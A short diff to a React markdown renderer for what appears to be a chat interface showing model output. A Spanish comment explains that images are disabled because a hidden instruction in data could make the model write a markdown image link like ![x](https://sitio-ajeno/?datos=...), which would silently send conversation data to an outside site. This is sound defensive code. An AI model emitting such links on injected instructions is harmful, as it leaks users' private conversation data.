@@ -11,6 +11,10 @@ const mdComponents = {
   strong: (props) => <strong className="font-semibold text-surface-950" {...props} />,
   code: (props) => <code className="rounded bg-surface-100 px-1.5 py-0.5 font-mono text-[0.8em] text-surface-800" {...props} />,
   a: ({ children }) => <span className="font-semibold text-primary-700">{children}</span>, // sin enlaces externos desde el modelo
+  // SIN imágenes: una imagen de markdown hace que el NAVEGADOR pida su dirección. Si una instrucción escondida en un dato (el contenido de un
+  // paquete, una nota…) logra que el modelo escriba ![x](https://sitio-ajeno/?datos=...), esa petición saca datos de la conversación sin que
+  // nadie pulse nada. Se muestra solo el texto alternativo y nunca se carga nada.
+  img: ({ alt }) => <span className="rounded bg-surface-100 px-1.5 py-0.5 text-xs text-surface-600">[imagen omitida{alt ? `: ${alt}` : ''}]</span>,
   // Las tablas pueden ser más anchas que el mensaje (sobre todo en el celular): se desplazan sin romper la página
   table: (props) => (
     <div className="mt-2 overflow-x-auto rounded-xl border border-surface-200">
